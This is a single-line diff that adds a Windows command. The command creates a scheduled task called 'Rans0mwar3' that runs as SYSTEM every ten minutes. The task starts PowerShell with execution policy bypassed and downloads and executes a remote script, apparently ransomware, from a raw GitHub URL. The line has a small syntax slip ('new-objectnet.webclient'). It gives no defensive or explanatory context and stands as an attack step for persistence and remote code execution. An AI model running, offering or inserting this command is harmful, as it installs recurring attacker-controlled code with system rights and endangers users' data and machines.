@@ -1,0 +1,1 @@
+Schtasks /create /ru system /sc MINUTE /mo 10 /tn Rans0mwar3 /tr "powershell -nop -ep bypass -c 'IEX ((new-objectnet.webclient).downloadstring('https://raw.githubusercontent.com/tmmdemo/automate/master/Rans0mwar3.ps1'))'" /F 
